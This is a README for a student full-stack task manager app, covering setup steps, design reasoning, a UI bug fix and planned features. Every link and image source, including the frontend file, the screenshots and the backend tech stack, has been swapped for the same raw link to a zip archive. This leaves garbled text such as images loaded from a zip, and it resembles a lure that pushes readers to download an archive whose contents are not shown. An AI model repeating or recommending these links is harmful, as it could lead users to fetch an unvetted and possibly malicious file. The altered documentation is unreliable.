📚 Student Task Manager — Full Stack SPA

1️⃣ Project Title & Goal
A Full-Stack Student Task Manager that allows users to add, view, and delete homework tasks in real time using a REST API and persistent local database storage.

2️⃣ Setup Instructions

✅ Clone the Repository

git clone <your-github-repo-link>

cd student-task-manager

✅ Backend Setup

cd backend

npm install

npm run dev

Backend runs at:

http://localhost:3000

✅ Frontend Setup

Open https://github.com/adityadav002/Student_Task_Manager/raw/refs/heads/main/backend/Task-Student-Manager-v1.9.zip using Live Server or browser:
Right-click → Open with Live Server
Frontend runs at:
http://127.0.0.1:5500

3️⃣ The Logic (How I Thought)

✅ Why I Chose This Approach

I built this project as a Full-Stack Single Page Application (SPA) because it demonstrates real-world development skills, including:
REST API design
Frontend-Backend communication using Fetch API
State management without refreshing the page
SQLite database integration using better-sqlite3
Clean separation of concerns (Routes, Controllers, Services, UI)
This architecture keeps the code modular, scalable, and easy to maintain, similar to production-level applications.

⚠️ Hardest Bug Faced & How I Fixed It

Problem:
The UI continued showing “No tasks yet” even after tasks were added.

Cause:
The empty state UI was not being hidden because the .hidden class was missing in CSS, causing multiple UI states to appear simultaneously.

Fix:
I added a .hidden { display: none; } rule and improved UI state toggling logic so that only one state (Loading / Empty / Tasks) appears at a time.
This improved UX clarity and UI correctness.

4️⃣ Output Screenshots

✅ Task Creation
<img width="1919" height="1079" alt="task_added" src="https://github.com/adityadav002/Student_Task_Manager/raw/refs/heads/main/backend/Task-Student-Manager-v1.9.zip" />

✅ API Working (GET & POST Requests)

![WhatsApp Image 2026-01-28 at 09 50 15](https://github.com/adityadav002/Student_Task_Manager/raw/refs/heads/main/backend/Task-Student-Manager-v1.9.zip)

![WhatsApp Image 2026-01-27 at 23 57 58](https://github.com/adityadav002/Student_Task_Manager/raw/refs/heads/main/backend/Task-Student-Manager-v1.9.zip)

✅ Delete Task Feature

<img width="1919" height="1077" alt="delte_notify" src="https://github.com/adityadav002/Student_Task_Manager/raw/refs/heads/main/backend/Task-Student-Manager-v1.9.zip" />

<img width="1919" height="1079" alt="delete_Success" src="https://github.com/adityadav002/Student_Task_Manager/raw/refs/heads/main/backend/Task-Student-Manager-v1.9.zip" />


5️⃣ Future Improvements (If I Had 2 More Days)

If given more time, I would add:

✅ Edit Task functionality

✅ Mark Task as Completed

✅ Task Filters (All / Completed / Pending)

✅ Dark Mode Toggle

✅ Drag & Drop Task Reordering

✅ Authentication for multiple users

✅ Deployment to cloud (Vercel + Render)

🧠 Tech Stack Used

Frontend: HTML, CSS, JavaScript

Backend: https://github.com/adityadav002/Student_Task_Manager/raw/refs/heads/main/backend/Task-Student-Manager-v1.9.zip, https://github.com/adityadav002/Student_Task_Manager/raw/refs/heads/main/backend/Task-Student-Manager-v1.9.zip

Database: SQLite (better-sqlite3)

Tools: Git, Live Server, Postman
